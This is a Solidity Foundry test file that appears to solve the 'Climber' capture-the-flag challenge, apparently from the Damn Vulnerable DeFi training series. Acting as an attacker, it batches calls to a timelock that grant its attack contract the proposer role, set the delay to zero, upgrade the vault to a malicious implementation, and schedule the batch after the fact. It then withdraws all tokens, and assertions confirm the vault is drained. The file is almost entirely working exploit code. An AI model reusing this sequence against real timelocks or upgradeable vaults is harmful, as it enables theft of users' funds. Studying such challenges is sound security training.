// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/ClimberFixture.sol";

import "src/src-default/attacker-contracts/AttackVault.sol";
import "src/src-default/attacker-contracts/AttackTimelock.sol";

contract ClimberTest is ClimberFixture {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    address[] public toAddress;
    bytes[] public data;
    uint256[] public zeroArray;

    AttackTimelock public attackContract;
    AttackVault public maliciousVault;

    function setUp() public override {
        super.setUp();
    }

    function test_climber() public {
        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        // Code your exploit here

        attackContract = new AttackTimelock(address(climberVault), payable(timelockAddress), address(token), attacker);

        maliciousVault = new AttackVault();

        // Set attacker contract as proposer for timelock
        bytes memory grantRoleData =
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(attackContract));
        // Update delay to 0
        bytes memory updateDelayData = abi.encodeWithSignature("updateDelay(uint64)", 0);
        // Call the vault to upgrade to attacker controlled contract logic
        bytes memory upgradeData = abi.encodeWithSignature("upgradeTo(address)", address(maliciousVault));
        // Call Attacking Contract to schedule these actions and sweep funds
        bytes memory exploitData = abi.encodeWithSignature("exploit()");

        toAddress.push(timelockAddress);
        toAddress.push(timelockAddress);
        toAddress.push(address(climberVault));
        toAddress.push(address(attackContract));

        data.push(grantRoleData);
        data.push(updateDelayData);
        data.push(upgradeData);
        data.push(exploitData);

        attackContract.setScheduleData(toAddress, data);

        zeroArray.push(0);
        zeroArray.push(0);
        zeroArray.push(0);
        zeroArray.push(0);

        timelockAddress.call(
            abi.encodeWithSignature(
                "execute(address[],uint256[],bytes[],bytes32)", toAddress, zeroArray, data, bytes32(0)
            )
        );

        attackContract.withdraw();

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() public {
        // Attacker has drained the vault
        assertEq(token.balanceOf(address(climberVault)), 0);
        assertEq(token.balanceOf(attacker), VAULT_TOKEN_BALANCE);
    }
}
